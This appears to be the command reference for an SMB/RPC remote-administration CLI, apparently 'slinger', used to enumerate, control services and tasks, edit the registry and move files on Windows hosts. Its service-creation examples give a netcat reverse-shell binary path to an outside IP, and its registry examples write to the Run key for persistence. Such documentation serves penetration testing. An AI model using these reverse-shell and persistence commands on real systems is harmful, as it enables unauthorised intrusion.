# CLI Commands Documentation

## `use`

**Description:** Connect to a specific share on the remote server

**Help:**
```
use [-h] share
Connect to a specific share on the remote server
```

**Example Usage:**
```
Example Usage: use <sharename> | use C$
```

### Arguments

- **`share`**: Specify the share name to connect to
  - Required: Yes

---

## `ls`

**Description:** List contents of a directory at a specified path. File paths with spaces must be entirely in quotes.

**Help:**
```
ls [-h] [-s {name,size,created,lastaccess,lastwrite}] [--sort-reverse] [-l] [-r depth] [-o filename] [--show] [--type {f,d,a}] [path]
List contents of a directory at a specified path. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: ls /path/to/directory
ls --type f -l          # List only files in long format
ls --type d             # List only directories
ls --type f -r 2        # Recursively list only files to depth 2
```

### Arguments

- **`path`**: Path to list contents, defaults to current path
  - Default: `.`
  - Required: No

- **`sort`**: Sort the directory contents by name, size, or date
  - Choices: name, size, created, lastaccess, lastwrite
  - Default: `date`
  - Required: No

- **`recursive`**: Recursively list directory contents with X depth
  - Required: No

- **`output`**: Save output to file
  - Required: No

- **`type`**: Filter by type: f=files only, d=directories only, a=all
  - Choices: f, d, a
  - Default: `a`
  - Required: No

---

## `find`

**Description:** Search for files and directories across the remote share with advanced filtering options.

**Help:**
```
find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE] [--mtime MTIME] [--ctime CTIME] [--atime ATIME] [--regex] [--iname] [--maxdepth MAXDEPTH] [--mindepth MINDEPTH]
                    [--limit LIMIT] [--sort {name,size,mtime,ctime,atime}] [--reverse] [--format {table,list,paths,json}] [-o OUTPUT] [--empty] [--hidden] [--progress]
                    [--timeout TIMEOUT]
                    pattern
Search for files and directories across the remote share with advanced filtering options.
```

**Example Usage:**
```
Example Usage: find "*.txt" -path /Users -type f -size +1MB
```

### Arguments

- **`pattern`**: Search pattern (supports wildcards like *.txt or regex with -regex flag)
  - Required: Yes

- **`path`**: Starting search path (default: current directory)
  - Default: `.`
  - Required: No

- **`type`**: Search type: f=files only, d=directories only, a=all
  - Choices: f, d, a
  - Default: `a`
  - Required: No

- **`size`**: File size filter: +1MB (larger than), -100KB (smaller than), =5GB (exactly)
  - Required: No

- **`mtime`**: Modified within N days (positive number)
  - Required: No

- **`ctime`**: Created within N days (positive number)
  - Required: No

- **`atime`**: Accessed within N days (positive number)
  - Required: No

- **`maxdepth`**: Maximum search depth
  - Default: `2`
  - Required: No

- **`mindepth`**: Minimum search depth
  - Default: `0`
  - Required: No

- **`limit`**: Maximum number of results to return
  - Required: No

- **`sort`**: Sort results by field
  - Choices: name, size, mtime, ctime, atime
  - Default: `name`
  - Required: No

- **`format`**: Output format
  - Choices: table, list, paths, json
  - Default: `table`
  - Required: No

- **`output`**: Save results to file
  - Required: No

- **`timeout`**: Search timeout in seconds
  - Default: `120`
  - Required: No

---

## `shares`

**Description:** List all shares available on the remote server

**Help:**
```
shares [-h] [-l]
List all shares available on the remote server
```

**Example Usage:**
```
Example Usage: shares
```

---

## `enumshares`

**Description:** List all shares available on the remote server

**Help:**
```
shares [-h] [-l]
List all shares available on the remote server
```

**Example Usage:**
```
Example Usage: shares
```

---

## `enumpipes`

**Description:** Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.

**Help:**
```
enumpipes [-h] [--detailed] [--method {smb,rpc,hybrid}] [--output filename]
Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.
```

**Example Usage:**
```
Example Usage: enumpipes --detailed --output pipes.txt
```

### Arguments

- **`method`**: Enumeration method to use
  - Choices: smb, rpc, hybrid
  - Default: `hybrid`
  - Required: No

- **`output`**: Save output to specified file
  - Required: No

---

## `cat`

**Description:** Display the contents of a specified file on the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
cat [-h] remote_path
Display the contents of a specified file on the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: cat /path/to/file
```

### Arguments

- **`remote_path`**: Specify the remote file path to display contents
  - Required: Yes

---

## `cd`

**Description:** Change to a different directory on the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
cd [-h] [path]
Change to a different directory on the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: cd /path/to/directory
```

### Arguments

- **`path`**: Directory path to change to, defaults to current directory
  - Default: `.`
  - Required: No

---

## `pwd`

**Description:** Print the current working directory on the remote server

**Help:**
```
pwd [-h]
Print the current working directory on the remote server
```

**Example Usage:**
```
Example Usage: pwd
```

---

## `exit`

**Description:** Exit the application

**Help:**
```
exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `quit`

**Description:** Exit the application

**Help:**
```
exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `logout`

**Description:** Exit the application

**Help:**
```
exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `logoff`

**Description:** Exit the application

**Help:**
```
exit [-h]
Exit the application
```

**Example Usage:**
```
Example Usage: exit
```

---

## `clear`

**Description:** Clear the screen

**Help:**
```
clear [-h]
Clear the screen
```

**Example Usage:**
```
Example Usage: clear
```

---

## `help`

**Description:** Display help information for the application

**Help:**
```
help [-h] [--verbose] [cmd]
Display help information for the application
```

**Example Usage:**
```
Example Usage: help
```

### Arguments

- **`cmd`**: Specify a command to show help for
  - Required: No

---

## `reconnect`

**Description:** Reconnect to the server to fix broken pipe or connection errors

**Help:**
```
reconnect [-h]
Reconnect to the server to fix broken pipe or connection errors
```

**Example Usage:**
```
Use this command when you encounter '[Errno 32] Broken pipe' errors
```

---

## `who`

**Description:** List the current sessions connected to the target host

**Help:**
```
who [-h]
List the current sessions connected to the target host
```

**Example Usage:**
```
Example Usage: who
```

---

## `enumdisk`

**Description:** Enumerate server disk information

**Help:**
```
enumdisk [-h]
Enumerate server disk information
```

**Example Usage:**
```
Example Usage: enumdisk
```

---

## `enumlogons`

**Description:** Enumerate users currently logged on the server

**Help:**
```
enumlogons [-h]
Enumerate users currently logged on the server
```

**Example Usage:**
```
Example Usage: enumlogons
```

---

## `enuminfo`

**Description:** Enumerate detailed information about the remote host

**Help:**
```
enuminfo [-h]
Enumerate detailed information about the remote host
```

**Example Usage:**
```
Example Usage: enuminfo
```

---

## `enumsys`

**Description:** Enumerate system information of the remote host

**Help:**
```
enumsys [-h]
Enumerate system information of the remote host
```

**Example Usage:**
```
Example Usage: enumsys
```

---

## `enumtransport`

**Description:** Enumerate transport information of the remote host

**Help:**
```
enumtransport [-h]
Enumerate transport information of the remote host
```

**Example Usage:**
```
Example Usage: enumtransport
```

---

## `enumservices`

**Description:** Enumerate services on the remote host

**Help:**
```
enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `servicesenum`

**Description:** Enumerate services on the remote host

**Help:**
```
enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `svcenum`

**Description:** Enumerate services on the remote host

**Help:**
```
enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `services`

**Description:** Enumerate services on the remote host

**Help:**
```
enumservices [-h] [-n] [--filter FILTER]
Enumerate services on the remote host
```

**Example Usage:**
```
Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n
```

### Arguments

- **`filter`**: Filter services by name or state
  - Required: No

---

## `serviceshow`

**Description:** Show details of a specific service on the remote server

**Help:**
```
serviceshow [-h] (-i SERVICEID | service_name)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `svcshow`

**Description:** Show details of a specific service on the remote server

**Help:**
```
serviceshow [-h] (-i SERVICEID | service_name)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `showservice`

**Description:** Show details of a specific service on the remote server

**Help:**
```
serviceshow [-h] (-i SERVICEID | service_name)
Show details of a specific service on the remote server
```

**Example Usage:**
```
Example Usage: serviceshow -i 123
```

### Arguments

- **`serviceid`**: Specify the ID of the service to show details for
  - Required: No

- **`service_name`**: Specify the name of the service to show
  - Required: No

---

## `servicestart`

**Description:** Start a specified service on the remote server

**Help:**
```
servicestart [-h] (-i SERVICEID | service_name)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `svcstart`

**Description:** Start a specified service on the remote server

**Help:**
```
servicestart [-h] (-i SERVICEID | service_name)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `servicerun`

**Description:** Start a specified service on the remote server

**Help:**
```
servicestart [-h] (-i SERVICEID | service_name)
Start a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestart -i 123  OR svcstart Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to start
  - Required: No

- **`service_name`**: Specify the name of the service to start
  - Required: No

---

## `servicestop`

**Description:** Stop a specified service on the remote server

**Help:**
```
servicestop [-h] (-i SERVICEID | service_name)
Stop a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestop -i 123  OR svcstop Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to stop
  - Required: No

- **`service_name`**: Specify the name of the service to stop
  - Required: No

---

## `svcstop`

**Description:** Stop a specified service on the remote server

**Help:**
```
servicestop [-h] (-i SERVICEID | service_name)
Stop a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicestop -i 123  OR svcstop Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to stop
  - Required: No

- **`service_name`**: Specify the name of the service to stop
  - Required: No

---

## `serviceenable`

**Description:** Enable a specified service on the remote server

**Help:**
```
serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `svcenable`

**Description:** Enable a specified service on the remote server

**Help:**
```
serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `enableservice`

**Description:** Enable a specified service on the remote server

**Help:**
```
serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `enablesvc`

**Description:** Enable a specified service on the remote server

**Help:**
```
serviceenable [-h] (-i SERVICEID | service_name)
Enable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: serviceenable -i 123  OR svcenable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to enable
  - Required: No

- **`service_name`**: Specify the name of the service to enable
  - Required: No

---

## `servicedisable`

**Description:** Disable a specified service on the remote server

**Help:**
```
servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `svcdisable`

**Description:** Disable a specified service on the remote server

**Help:**
```
servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `disableservice`

**Description:** Disable a specified service on the remote server

**Help:**
```
servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `disablesvc`

**Description:** Disable a specified service on the remote server

**Help:**
```
servicedisable [-h] (-i SERVICEID | service_name)
Disable a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedisable -i 123  OR svcdisable Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to disable
  - Required: No

- **`service_name`**: Specify the name of the service to disable
  - Required: No

---

## `servicedel`

**Description:** Delete a specified service on the remote server

**Help:**
```
servicedel [-h] (-i SERVICEID | service_name)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `svcdelete`

**Description:** Delete a specified service on the remote server

**Help:**
```
servicedel [-h] (-i SERVICEID | service_name)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `servicedelete`

**Description:** Delete a specified service on the remote server

**Help:**
```
servicedel [-h] (-i SERVICEID | service_name)
Delete a specified service on the remote server
```

**Example Usage:**
```
Example Usage: servicedelete -i 123  OR svcdelete Spooler
```

### Arguments

- **`serviceid`**: Specify the ID of the service to delete
  - Required: No

- **`service_name`**: Specify the name of the service to delete
  - Required: No

---

## `serviceadd`

**Description:** Create a new service on the remote server

**Help:**
```
serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `svcadd`

**Description:** Create a new service on the remote server

**Help:**
```
serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `servicecreate`

**Description:** Create a new service on the remote server

**Help:**
```
serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `svccreate`

**Description:** Create a new service on the remote server

**Help:**
```
serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
Create a new service on the remote server
```

**Example Usage:**
```
Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
```

### Arguments

- **`name`**: Specify the name of the new service
  - Required: Yes

- **`binary_path`**: Specify the binary path of the new service
  - Required: Yes

- **`display_name`**: Specify the display name of the new service
  - Required: Yes

- **`start_type`**: Specify the start type of the new service
  - Choices: auto, demand, system
  - Default: `demand`
  - Required: Yes

---

## `enumtasks`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
enumtasks [-h] [-n] [--filter FILTER]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Windows OR enumtasks -n
```

### Arguments

- **`filter`**: Filter tasks by name or folder
  - Required: No

---

## `tasksenum`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
enumtasks [-h] [-n] [--filter FILTER]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Windows OR enumtasks -n
```

### Arguments

- **`filter`**: Filter tasks by name or folder
  - Required: No

---

## `taskenum`

**Description:** Enumerate scheduled tasks on the remote server

**Help:**
```
enumtasks [-h] [-n] [--filter FILTER]
Enumerate scheduled tasks on the remote server
```

**Example Usage:**
```
Example Usage: enumtasks --filter name=Microsoft OR enumtasks --filter folder=Windows OR enumtasks -n
```

### Arguments

- **`filter`**: Filter tasks by name or folder
  - Required: No

---

## `taskshow`

**Description:** Show details of a specific task on the remote server

**Help:**
```
taskshow [-h] (-i TASK_ID | task_path)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`task_id`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `tasksshow`

**Description:** Show details of a specific task on the remote server

**Help:**
```
taskshow [-h] (-i TASK_ID | task_path)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`task_id`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `showtask`

**Description:** Show details of a specific task on the remote server

**Help:**
```
taskshow [-h] (-i TASK_ID | task_path)
Show details of a specific task on the remote server
```

**Example Usage:**
```
Example Usage: tasksshow -i 123
```

### Arguments

- **`task_id`**: Specify the ID of the task to show
  - Required: No

- **`task_path`**: Specify the full path of the task to show
  - Required: No

---

## `taskcreate`

**Description:** Create a new scheduled task on the remote server

**Help:**
```
taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
Create a new scheduled task on the remote server
```

**Example Usage:**
```
Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
```

### Arguments

- **`name`**: Specify the name of the new task
  - Required: Yes

- **`program`**: Specify the program to run (cmd.exe)
  - Required: Yes

- **`arguments`**: Specify the arguments to pass to the program
  - Required: No

- **`folder`**: Specify the folder to create the task in
  - Default: ``
  - Required: No

- **`interval`**: Specify an interval in minutes to run the task
  - Required: No

- **`date`**: Specify the date to start the task (2099-12-31 14:01:00)
  - Required: No

---

## `taskadd`

**Description:** Create a new scheduled task on the remote server

**Help:**
```
taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
Create a new scheduled task on the remote server
```

**Example Usage:**
```
Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' -f \\Windows
```

### Arguments

- **`name`**: Specify the name of the new task
  - Required: Yes

- **`program`**: Specify the program to run (cmd.exe)
  - Required: Yes

- **`arguments`**: Specify the arguments to pass to the program
  - Required: No

- **`folder`**: Specify the folder to create the task in
  - Default: ``
  - Required: No

- **`interval`**: Specify an interval in minutes to run the task
  - Required: No

- **`date`**: Specify the date to start the task (2099-12-31 14:01:00)
  - Required: No

---

## `taskrun`

**Description:** Run a specified task on the remote server

**Help:**
```
taskrun [-h] task_path
Run a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskrun \\Windows\\newtask
```

### Arguments

- **`task_path`**: Specify the full path of the task to run
  - Required: Yes

---

## `taskexec`

**Description:** Run a specified task on the remote server

**Help:**
```
taskrun [-h] task_path
Run a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskrun \\Windows\\newtask
```

### Arguments

- **`task_path`**: Specify the full path of the task to run
  - Required: Yes

---

## `taskdelete`

**Description:** Delete a specified task on the remote server

**Help:**
```
taskdelete [-h] [-i TASK_ID] [task_path]
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`task_id`**: Specify the ID of the task to delete
  - Required: No

---

## `taskdel`

**Description:** Delete a specified task on the remote server

**Help:**
```
taskdelete [-h] [-i TASK_ID] [task_path]
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`task_id`**: Specify the ID of the task to delete
  - Required: No

---

## `taskrm`

**Description:** Delete a specified task on the remote server

**Help:**
```
taskdelete [-h] [-i TASK_ID] [task_path]
Delete a specified task on the remote server
```

**Example Usage:**
```
Example Usage: taskdelete -i 123
```

### Arguments

- **`task_path`**: Specify the full path of the task to delete
  - Required: No

- **`task_id`**: Specify the ID of the task to delete
  - Required: No

---

## `time`

**Description:** Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call

**Help:**
```
time [-h]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: time
```

---

## `enumtime`

**Description:** Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call

**Help:**
```
time [-h]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: time
```

---

## `servertime`

**Description:** Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call

**Help:**
```
time [-h]
Get the current time, date, timezone, and uptime from the remote server via NetrRemoteTOD RPC call
```

**Example Usage:**
```
Example Usage: time
```

---

## `upload`

**Description:** Upload a file to the remote server

**Help:**
```
upload [-h] local_path [remote_path]
Upload a file to the remote server
```

**Example Usage:**
```
Example Usage: upload /local/path /remote/path
```

### Arguments

- **`local_path`**: Specify the local file path to upload
  - Required: Yes

- **`remote_path`**: Specify the remote file path to upload to, optional
  - Required: No

---

## `put`

**Description:** Upload a file to the remote server

**Help:**
```
upload [-h] local_path [remote_path]
Upload a file to the remote server
```

**Example Usage:**
```
Example Usage: upload /local/path /remote/path
```

### Arguments

- **`local_path`**: Specify the local file path to upload
  - Required: Yes

- **`remote_path`**: Specify the remote file path to upload to, optional
  - Required: No

---

## `download`

**Description:** Download a file from the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE] remote_path [local_path]
Download a file from the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
```

### Arguments

- **`remote_path`**: Specify the remote file path to download
  - Required: Yes

- **`local_path`**: Specify the local file path to download to, optional
  - Required: No

- **`chunk_size`**: Chunk size for download (e.g., 64k, 1M, 512k)
  - Default: `64k`
  - Required: No

---

## `get`

**Description:** Download a file from the remote server. File paths with spaces must be entirely in quotes.

**Help:**
```
download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE] remote_path [local_path]
Download a file from the remote server. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
```

### Arguments

- **`remote_path`**: Specify the remote file path to download
  - Required: Yes

- **`local_path`**: Specify the local file path to download to, optional
  - Required: No

- **`chunk_size`**: Chunk size for download (e.g., 64k, 1M, 512k)
  - Default: `64k`
  - Required: No

---

## `mget`

**Description:** Download all files from a specified directory and its subdirectories. File paths with spaces must be entirely in quotes.

**Help:**
```
mget [-h] [-r] [-p regex] [-d D] [remote_path] [local_path]
Download all files from a specified directory and its subdirectories. File paths with spaces must be entirely in quotes.
```

**Example Usage:**
```
Example Usage: mget /remote/path /local/path
```

### Arguments

- **`remote_path`**: Specify the remote directory path to download from
  - Required: No

- **`local_path`**: Specify the local directory path where files will be downloaded
  - Required: No

- **`p`**: Specify a regex pattern to match filenames
  - Required: No

- **`d`**: Specify folder depth count for recursion
  - Default: `2`
  - Required: No

---

## `mkdir`

**Description:** Create a new directory on the remote server

**Help:**
```
mkdir [-h] path
Create a new directory on the remote server
```

**Example Usage:**
```
Example Usage: mkdir /path/to/new/directory
```

### Arguments

- **`path`**: Specify the path of the directory to create
  - Required: Yes

---

## `rmdir`

**Description:** Remove a directory on the remote server

**Help:**
```
rmdir [-h] remote_path
Remove a directory on the remote server
```

**Example Usage:**
```
Example Usage: rmdir /path/to/remote/directory
```

### Arguments

- **`remote_path`**: Specify the remote path of the directory to remove
  - Required: Yes

---

## `rm`

**Description:** Delete one or more files on the remote server

**Help:**
```
rm [-h] [-n FILE_LIST] [remote_path]
Delete one or more files on the remote server
```

**Example Usage:**
```
Example Usage: rm file.txt, rm -n 'file1.txt file2.txt file3.txt'
```

### Arguments

- **`remote_path`**: Specify the remote file path to delete
  - Required: No

- **`file_list`**: Space-separated list of files to delete (quoted)
  - Required: No

---

## `#shell`

**Description:** Enter local terminal mode for command execution

**Help:**
```
#shell [-h]
Enter local terminal mode for command execution
```

**Example Usage:**
```
Example Usage: #shell
```

---

## `!`

**Description:** Run a specified local command

**Help:**
```
! [-h] ...
Run a specified local command
```

**Example Usage:**
```
Example Usage: ! ls -l
```

### Arguments

- **`commands`**: Specify the local commands to run
  - Required: No

---

## `info`

**Description:** Display the status of the current session

**Help:**
```
info [-h]
Display the status of the current session
```

**Example Usage:**
```
Example Usage: info
```

---

## `history`

**Description:** Display recent command history from the slinger history file

**Help:**
```
history [-h] [-n NUM]
Display recent command history from the slinger history file
```

**Example Usage:**
```
Example Usage: history, history -n 20
```

### Arguments

- **`n`**: Number of history lines to display (default: 15)
  - Default: `15`
  - Required: No

---

## `reguse`

**Description:** Connect to a remote registry on the remote server

**Help:**
```
reguse [-h]
Connect to a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: reguse
```

---

## `regstart`

**Description:** Connect to a remote registry on the remote server

**Help:**
```
reguse [-h]
Connect to a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: reguse
```

---

## `regstop`

**Description:** Disconnect from a remote registry on the remote server

**Help:**
```
regstop [-h]
Disconnect from a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: regstop
```

---

## `regquery`

**Description:** Query a registry key on the remote server

**Help:**
```
regquery [-h] [-l] [-v] key
Query a registry key on the remote server
```

**Example Usage:**
```
Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run (You must use two slashes or quotes)
```

### Arguments

- **`key`**: Specify the registry key to query
  - Required: Yes

---

## `regset`

**Description:** Set a registry value on the remote server

**Help:**
```
regset [-h] -k KEY -v VALUE -d DATA [-t TYPE]
Set a registry value on the remote server
```

**Example Usage:**
```
Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test -d "C:\test.exe"
```

### Arguments

- **`key`**: Specify the registry key to set
  - Required: Yes

- **`value`**: Specify the registry value to set
  - Required: Yes

- **`data`**: Specify the registry data to set
  - Required: Yes

- **`type`**: Specify the registry type to set
  - Default: `REG_SZ`
  - Required: No

---

## `regdel`

**Description:** Delete a registry value on the remote server

**Help:**
```
regdel [-h] -k KEY [-v VALUE]
Delete a registry value on the remote server
```

**Example Usage:**
```
Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test
```

### Arguments

- **`key`**: Specify the registry key to delete
  - Required: Yes

- **`value`**: Specify the registry value to delete
  - Required: No

---

## `regcreate`

**Description:** Create a registry key on the remote server

**Help:**
```
regcreate [-h] key
Create a registry key on the remote server
```

**Example Usage:**
```
Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
```

### Arguments

- **`key`**: Specify the registry key to create
  - Required: Yes

---

## `regcheck`

**Description:** Check if a registry key exists on the remote server. This is really just an exposed helper function.

**Help:**
```
regcheck [-h] key
Check if a registry key exists on the remote server. This is really just an exposed helper function.
```

**Example Usage:**
```
Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
```

### Arguments

- **`key`**: Specify the registry key to check
  - Required: Yes

---

## `portfwd`

**Description:** Forward a local port to a remote port on the remote server

**Help:**
```
portfwd [-h] (-d | -a | -l | -c | --load) local remote
Forward a local port to a remote port on the remote server
```

**Example Usage:**
```
Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]
```

### Arguments

- **`local`**: Specify the local host and port to forward from
  - Required: Yes

- **`remote`**: Specify the remote host and port to forward to
  - Required: Yes

---

## `ifconfig`

**Description:** Display network interfaces on the remote server

**Help:**
```
ifconfig [-h]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `ipconfig`

**Description:** Display network interfaces on the remote server

**Help:**
```
ifconfig [-h]
